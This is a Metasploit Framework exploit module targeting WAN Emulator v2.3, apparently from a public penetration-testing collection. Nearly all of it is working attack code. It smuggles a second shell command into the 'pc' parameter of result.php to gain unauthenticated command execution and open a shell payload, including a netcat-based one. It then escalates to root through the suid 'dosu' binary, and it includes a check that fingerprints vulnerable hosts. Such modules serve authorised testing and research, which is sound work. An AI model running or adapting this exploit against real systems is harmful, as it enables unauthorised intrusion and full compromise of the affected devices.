##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WAN Emulator v2.3 Command Execution',
			'Description'    => %q{
				This module exploits a command execution vulnerability in WAN Emulator
				version 2.3 which can be abused to allow unauthenticated users to execute
				arbitrary commands under the context of the 'www-data' user.
				The 'result.php' script calls shell_exec() with user controlled data
				from the 'pc' parameter. This module also exploits a command execution
				vulnerability to gain root privileges. The 'dosu' binary is suid 'root'
				and vulnerable to command execution in argument one.
			},
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 1 $',
			'Privileged'     => true,
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Author'         =>
				[
					'Brendan Coles <bcoles[at]gmail.com>', # Discovery and exploit
				],
			'References'     =>
				[
					['URL', 'http://itsecuritysolutions.org/2012-08-12-wanem-v2.3-multiple-vulnerabilities/']
					#['OSVDB', ''],
					#['EDB',   ''],
				],
			'Payload'        =>
				{
					'Space'       => 1024,
					'BadChars'    => "\x00",
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic netcat-e',
						}
				},
			'DefaultOptions' =>
				{
					'ExitFunction' => 'none'
				},
			'Targets'        =>
				[
					['Automatic Targeting', { 'auto' => true }]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 12 2012'
		))
	end

	def on_new_session(client)
		client.shell_command_token("/UNIONFS/home/perc/dosu /bin/sh")
	end

	def check

		res   = send_request_cgi({
			'method' => 'GET',
			'uri'    => '/WANem/result.php'
		})
		if res and res.body =~ /<br><br><br><b><font color=red>Can't measure\!\! Please repeat\.<\/font><\/b><\/body>/
			return Exploit::CheckCode::Appears
		else
			return Exploit::CheckCode::Safe
		end

	end

	def exploit

		@peer = "#{rhost}:#{rport}"
		data  = "pc=127.0.0.1; "
		data << URI.encode(payload.raw)
		data << "%26"
		print_status("#{@peer} - Sending payload (#{payload.raw.length} bytes)")
		begin
			res = send_request_cgi({
				'uri'    => '/WANem/result.php',
				'method' => 'POST',
				'data'   => data
			}, 25)
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("#{@peer} - Connection failed")
		end
		if res and res.code == 200
			print_good("#{@peer} - Payload sent successfully")
		else
			print_error("#{@peer} - Sending payload failed")
		end
	end

end
